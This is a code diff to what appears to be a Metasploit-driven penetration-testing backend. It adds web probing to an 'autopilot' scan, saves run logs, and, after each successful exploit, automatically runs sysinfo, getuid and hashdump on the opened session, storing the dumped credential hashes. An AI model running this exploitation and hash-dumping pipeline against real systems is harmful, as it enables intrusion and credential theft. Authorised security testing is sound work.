@@ -487,6 +487,35 @@ def session_report(fmt: str = "json") -> dict[str, Any]:
             )
     conn.close()
 
+    runs: list[dict[str, Any]] = []
+    with suppress(Exception):
+        conn = _neighbor_db()
+        rows = conn.execute(
+            "SELECT run_id, created_at, scope, message, log FROM autopilot_runs ORDER BY created_at DESC LIMIT 5"
+        ).fetchall()
+        conn.close()
+        runs = [
+            {
+                "run_id": r[0],
+                "created_at": r[1],
+                "scope": r[2],
+                "message": r[3],
+                "log": r[4],
+            }
+            for r in rows
+        ]
+    with suppress(Exception):
+        conn = _neighbor_db()
+        recon_rows = conn.execute(
+            "SELECT msf_session_id, command, output FROM session_recon ORDER BY at"
+        ).fetchall()
+        conn.close()
+        recon_bysess: dict[str, list[dict[str, Any]]] = {}
+        for r in recon_rows:
+            recon_bysess.setdefault(str(r[0]), []).append(
+                {"command": r[1], "output": str(r[2])[:600]}
+            )
+
     report = {
         **meta,
         "scope": _session_scope_info(),
@@ -506,8 +535,12 @@ def session_report(fmt: str = "json") -> dict[str, Any]:
         ],
         "vulns": vulns,
         "credentials": creds,
-        "sessions": sessions,
+        "sessions": [
+            {**s, "recon": recon_bysess.get(str(s["msf_session_id"]), [])}
+            for s in sessions
+        ],
         "exploit_attempts": attempts,
+        "autopilot_runs": runs,
     }
 
     scope_info: Any = report["scope"]
@@ -582,6 +615,8 @@ def reset_session(wipe_engagements: bool = False) -> dict[str, Any]:
         "discovered_hosts",
         "found_creds",
         "exploit_sessions",
+        "session_recon",
+        "autopilot_runs",
     ):
         conn.execute(f"DROP TABLE IF EXISTS {table}")
     new_id = _new_session_id()
@@ -1685,22 +1720,12 @@ def pass_attack_creds() -> dict[str, Any]:
     }
 
 
-@router.post("/webprobe")
-def web_probe(req: dict[str, Any]) -> dict[str, Any]:
-    """Probe an HTTP(S) service: server header, page title, common admin paths.
-
-    Read-only recon enrichment for the Default-Cred Targets card — no exploit,
-    no brute force, just GETs.
-    """
+def _do_web_probe(host: str, port: int) -> dict[str, Any]:
+    """GET-level probe of an HTTP(S) surface: server header, title, admin paths."""
     import urllib.error
     import urllib.request
 
-    host = (req.get("host") or "").strip()
-    port = int(req.get("port") or 80)
-    if not host:
-        raise HTTPException(status_code=422, detail="host required")
-    _demand_scope(host)
-    scheme = "https" if req.get("tls") or port in (443, 8443) else "http"
+    scheme = "https" if port in (443, 8443) else "http"
     base = f"{scheme}://{host}:{port}"
 
     headers = {"User-Agent": "h4k-webprobe/1.0"}
@@ -1755,6 +1780,21 @@ def web_probe(req: dict[str, Any]) -> dict[str, Any]:
             result["paths"].append({"path": p, "status": pstatus})
 
     return result
+
+
+@router.post("/webprobe")
+def web_probe(req: dict[str, Any]) -> dict[str, Any]:
+    """Probe an HTTP(S) service: server header, page title, common admin paths.
+
+    Read-only recon enrichment for the Default-Cred Targets card — no exploit,
+    no brute force, just GETs. Scope-enforced.
+    """
+    host = (req.get("host") or "").strip()
+    port = int(req.get("port") or 80)
+    if not host:
+        raise HTTPException(status_code=422, detail="host required")
+    _demand_scope(host)
+    return _do_web_probe(host, port)
 
 
 @router.get("/passattack/{job_id}")
@@ -1992,8 +2032,20 @@ def _run_attack(job: dict[str, Any], req: AttackRequest, msf: MsfClient) -> None
     _update(job, status="running")
     try:
         attacks = svc.run(req, known)
-        _record_sessions(attacks)
-        _update(job, attacks=attacks, status="done", message="attack complete")
+        opened = _record_sessions(attacks)
+        for a in opened:
+            recon = _post_exploit_recon(a["session_id"])
+            a["recon"] = recon
+        if opened:
+            n = len(opened)
+            _update(
+                job,
+                status="done",
+                message=f"attack complete — {n} session(s) opened, quick recon captured",
+            )
+            _update(job, attacks=attacks)
+        else:
+            _update(job, attacks=attacks, status="done", message="attack complete")
     except Exception as exc:  # pragma: no cover - defensive
         logger.exception("attack job failed")
         _update(job, status="error", error=str(exc), message="attack failed")
@@ -2023,13 +2075,13 @@ def _load_found_creds(host: str | None, port: int | None) -> list[dict[str, Any]
     ]
 
 
-def _record_sessions(attacks: list[dict[str, Any]]) -> int:
-    """Persist sessions opened by successful exploits into the neighbors DB."""
+def _record_sessions(attacks: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    """Persist sessions opened by successful exploits into the neighbors DB,
+    then run the standard post-exploit recon set on each and store the output."""
     from datetime import UTC, datetime
 
-    opened = 0
+    opened: list[dict[str, Any]] = []
     conn = _neighbor_db()
-    conn.commit()
     now = datetime.now(UTC).isoformat()
     for a in attacks:
         sid = a.get("session_id")
@@ -2039,10 +2091,55 @@ def _record_sessions(attacks: list[dict[str, Any]]) -> int:
                 "VALUES (?, ?, ?, ?, ?)",
                 (str(sid), a.get("host", ""), a.get("port"), a.get("module"), now),
             )
-            opened += 1
+            opened.append(a)
     conn.commit()
     conn.close()
     return opened
+
+
+def _post_exploit_recon(msf_session_id: str) -> dict[str, str]:
+    """Run the standard proof-of-access set on a fresh session.
+
+    sysinfo/getuid prove code execution; hashdump is where the next move
+    lives. Output is stored so the report can show what the session yielded.
+    """
+    results: dict[str, str] = {}
+    conn = _neighbor_db()
+    conn.execute(
+        "CREATE TABLE IF NOT EXISTS session_recon ("
+        "  msf_session_id TEXT NOT NULL,"
+        "  command        TEXT NOT NULL,"
+        "  output         TEXT NOT NULL,"
+        "  at             TEXT NOT NULL,"
+        "  PRIMARY KEY (msf_session_id, command)"
+        ")"
+    )
+    conn.commit()
+    msf = _get_msf()
+    if msf is None:
+        conn.close()
+        return results
+    sess = None
+    try:
+        sess = msf.client.sessions.session(str(msf_session_id))
+    except Exception:
+        sess = None
+    if sess is None:
+        conn.close()
+        return results
+    for cmd in ("sysinfo", "getuid", "hashdump"):
+        with suppress(Exception):
+            out = str(sess.run_shell_cmd(cmd))[:600]
+        if out:
+            results[cmd] = out
+            conn.execute(
+                "INSERT OR REPLACE INTO session_recon (msf_session_id, command, output, at) "
+                "VALUES (?, ?, ?, ?)",
+                (str(msf_session_id), cmd, out, datetime.now(UTC).isoformat()),
+            )
+    conn.commit()
+    conn.close()
+    return results
 
 
 @router.get("/attack/{job_id}")
@@ -2866,6 +2963,29 @@ def _run_autopilot(job: dict[str, Any], msf: MsfClient, scope_cidrs: list[str]) 
         if not parsed:
             _ap_note_host(job, ip, stage="unreachable")
             _ap_log(job, f"[-] {ip}: no response")
+        # web enrichment: title/server/admin-path probe per open web service
+        web_ports = [
+            int(s.get("port") or 0)
+            for s in (entry.get("services", []) if entry else [])
+            if s.get("state") == "open" and "http" in str(s.get("service") or "")
+        ]
+        for wp in web_ports[:2]:
+            with suppress(Exception):
+                probe = _do_web_probe(ip, wp)
+                title = probe.get("title") or ""
+                server = probe.get("server") or ""
+                admin_paths_txt = ", ".join(
+                    str(p["path"]) for p in probe.get("paths", [])
+                )
+                _ap_log(
+                    job,
+                    "[web] "
+                    + f"{ip}:{wp} {server} '{title[:50]}'"
+                    + (f" | admin paths: {admin_paths_txt}" if admin_paths_txt else ""),
+                )
+                _ap_note_host(
+                    job, ip, web={"port": wp, "server": server, "title": title}
+                )
         _update(job, progress=_pct(1, (idx + 1) / max(1, len(found_ips))))
     if _stopped():
         _ap_log(job, "[!] aborted during fingerprint")
@@ -3083,8 +3203,20 @@ def _run_autopilot(job: dict[str, Any], msf: MsfClient, scope_cidrs: list[str]) 
                 + (f" — session {a['session_id']}" if a.get("session_id") else ""),
             )
             if a.get("session_id") and a.get("result") == "success":
+                a["port"] = port_
                 _record_sessions([a])
-                _ap_note_host(job, ip, stage="pwned", session_id=a["session_id"])
+                recon = _post_exploit_recon(a["session_id"])
+                a["recon"] = recon
+                uid = (recon.get("getuid") or "").strip().split("\n")[-1][:60]
+                if uid:
+                    _ap_log(job, f"[recon] {ip} session uid: {uid}")
+                _ap_note_host(
+                    job,
+                    ip,
+                    stage="pwned",
+                    session_id=a["session_id"],
+                    recon=sorted(recon.keys()),
+                )
                 session_opens.append(a)
         _update(job, progress=_pct(4, (idx + 1) / max(1, len(attempts_planned))))
 
@@ -3097,6 +3229,32 @@ def _run_autopilot(job: dict[str, Any], msf: MsfClient, scope_cidrs: list[str]) 
         f"{sum(len(c) for c in creds_by_host.values())} cred(s), "
         f"{len(session_opens)} session(s)",
     )
+    try:
+        conn = _neighbor_db()
+        conn.execute(
+            "CREATE TABLE IF NOT EXISTS autopilot_runs ("
+            "  run_id      TEXT PRIMARY KEY,"
+            "  created_at  TEXT NOT NULL,"
+            "  scope       TEXT NOT NULL,"
+            "  message     TEXT NOT NULL,"
+            "  log         TEXT NOT NULL"
+            ")"
+        )
+        conn.execute(
+            "INSERT OR REPLACE INTO autopilot_runs (run_id, created_at, scope, message, log) "
+            "VALUES (?, ?, ?, ?, ?)",
+            (
+                job["id"],
+                datetime.now(UTC).isoformat(),
+                ", ".join(scope_cidrs),
+                job.get("message") or "",
+                "\n".join(job.get("log", [])),
+            ),
+        )
+        conn.commit()
+        conn.close()
+    except Exception as exc:  # pragma: no cover - persistence must not fail runs
+        logger.warning("could not persist autopilot run: %s", exc)
     _update(
         job,
         status="done",
